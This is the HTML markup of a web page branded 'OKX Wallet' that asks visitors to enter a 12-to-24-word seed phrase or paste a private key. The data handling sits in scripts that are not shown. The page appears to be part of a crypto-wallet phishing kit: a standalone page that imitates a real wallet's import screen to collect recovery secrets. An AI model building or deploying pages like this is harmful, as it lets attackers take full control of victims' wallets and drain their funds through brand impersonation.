<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>OKX Wallet</title>
  <link rel="stylesheet" href="/assets/css/import-wallet.css">
  <link rel="icon" type="image/png" href="/assets/img/favicon.ico">
</head>
<body>
  <section class="page-seedphrase active">
    <div class="seed-header">
      <button class="back-btn" id="backSeedBtn" aria-label="Back">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="15 18 9 12 15 6"/>
        </svg>
      </button>
      <h2>Seed phrase or private key</h2>
    </div>
    <div class="seed-tabs">
      <button class="tab-btn active" id="seedTabBtn">Seed Phrase</button>
      <button class="tab-btn" id="privTabBtn">Private Key</button>
    </div>
    <!-- Wrapper untuk konten scrollable -->
    <div class="seed-content-scrollable">
      <div class="seed-phrase-panel">
        <div class="seed-words-select">
          <span>My seed phrase consists of</span>
          <button class="dropdown-btn" id="wordDropdownBtn">
            <span id="wordCountLabel">12 words</span>
            <svg width="18" height="18" style="margin-left:2px;" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5" stroke="#888" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
          </button>
          <div class="dropdown-list" id="wordDropdownList">
            <div data-value="12">12 words <span class="checkmark"></span></div>
            <div data-value="15">15 words</div>
            <div data-value="18">18 words</div>
            <div data-value="21">21 words</div>
            <div data-value="24">24 words</div>
          </div>
        </div>
        <div class="seed-inputs" id="seedInputs">
          <!-- Auto-generated by JS -->
        </div>
      </div>
      <div class="privkey-panel" style="display:none;">
        <label for="privkeyarea" class="privkey-label">Private key</label>
        <textarea id="privkeyarea" placeholder="Paste or enter your private key"></textarea>
      </div>
    </div>
    <!-- Tombol selalu di bawah -->
    <button class="confirm-btn" id="seedConfirmBtn" disabled>Confirmation</button>
  </section>
   <script src="/assets/js/wordlist.js"></script>
  <script src="/assets/js/seed.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>
</body>
</html>
